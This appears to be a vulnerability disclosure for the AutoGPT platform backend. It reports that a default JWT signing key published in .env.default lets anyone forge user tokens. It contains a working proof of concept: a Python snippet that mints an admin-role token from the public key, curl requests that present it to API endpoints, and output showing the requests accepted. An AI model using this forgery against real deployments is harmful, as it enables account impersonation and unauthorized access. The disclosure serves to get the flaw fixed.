# AutoGPT platform: default JWT_VERIFY_KEY published in repository enables arbitrary token forgery

## Description

`autogpt_platform/backend/.env.default:50` ships with:
```
JWT_VERIFY_KEY=your-super-secret-jwt-token-with-at-least-32-characters-long
```

The docker-compose deployment loads this file by default. The JWT verification code in `autogpt_libs/autogpt_libs/auth/jwt_utils.py` (L100-105) accepts any HS256-signed token verified against this shared secret — anyone who has read the public repository knows the key. The attacker forges tokens with arbitrary `sub` (user ID) and `role` claims.

The **service-token path** (`autogpt_libs/auth/service.py` L61-70) explicitly rejects HS256 tokens ("symmetrically signed service tokens are not accepted"), but the **user-token path** (`get_jwt_payload` / `parse_jwt_token`) does not — it accepts HS256 with `JWT_VERIFY_KEY` as the signing key.

## Impact

Anyone who has read the public AutoGPT repository (or any fork/clone) can forge valid JWT user tokens with arbitrary identity. On a deployment that uses the default `.env.default`:

- Full platform authentication as any user ID
- Access to all authenticated API endpoints (graphs, executions, market, admin functions)
- The attack requires no prior credentials, no network position, and no user interaction

## PoC

```bash
# Prerequisite: AutoGPT platform backend running with .env copied from .env.default
# (the documented docker-compose setup does exactly this)

pip install pyjwt
python3 - << 'PYEOF'
import jwt, datetime
KEY = "your-super-secret-jwt-token-with-at-least-32-characters-long"
claims = {"sub": "00000000-dead-beef-0000-000000004242", "role": "admin",
          "aud": "authenticated",
          "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)}
print(jwt.encode(claims, KEY, algorithm="HS256"))
PYEOF

# Use the forged token:
curl -H "Authorization: Bearer <forged_token>" http://<backend>:8000/api/graphs
curl -H "Authorization: Bearer <forged_token>" http://<backend>:8000/api/credits
```

## Execution result

```
=== forged token (key from .env.default, which is in the public repo) ===
GET /api/graphs  with Bearer <forged> → {"graphs":[]} [code 200]
GET /api/credits with Bearer <forged> → {"credits":100} [code 200]

=== negative control: same claims, wrong key ===
GET /api/graphs  with Bearer <wrong-key> → {"detail":"Invalid token: Signature verification failed"} [code 401]

=== negative control: no token ===
GET /api/credits without header → {"detail":"Authorization header is missing"} [code 401]
```

The forged token (signed with the repository-public default key) is accepted as a valid authenticated user session with full API access. The wrong-key and no-token controls confirm that signature verification is active and the acceptance is specifically due to the known key value.
